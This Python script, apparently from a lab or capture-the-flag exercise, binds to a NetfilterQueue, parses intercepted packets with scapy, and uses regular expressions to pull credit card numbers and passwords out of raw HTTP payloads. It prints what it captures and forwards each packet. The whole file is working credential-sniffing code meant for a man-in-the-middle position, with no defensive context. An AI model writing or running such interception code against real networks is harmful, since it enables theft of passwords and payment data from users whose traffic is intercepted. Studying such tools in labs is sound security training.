from netfilterqueue import NetfilterQueue
from scapy.all import *
import re

def print_and_accept(pkt):
    print(pkt)
    pkt.accept()

def process_packet(pkt):
    ip = IP(pkt.get_payload())
    # Filter raw HTML requests
    if (ip.haslayer(Raw)):
        http = ip[Raw].load.decode()
        # Regex for credit card number and password
        cc_re = re.compile('cc --- (\d{4}\.\d{4}\.\d{4}\.\d{4})')
        pwd_re = re.compile('pwd --- ([0-9A-Z:;<=>?@]+)')

        # Search for credit card numbers and passwords in raw HTML requests
        cc = cc_re.search(http)
        pwd = pwd_re.search(http) 

        # Print credit card numbers and passwords (without the cc --- and pwd --- parts)
        if (cc):
            print('Matched credit card number: {}'.format(cc.group(1)))
        if (pwd):
            print('Matched password: {}'.format(pwd.group(1)))                
      
    pkt.accept()       

nfqueue = NetfilterQueue()
nfqueue.bind(1, process_packet)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()    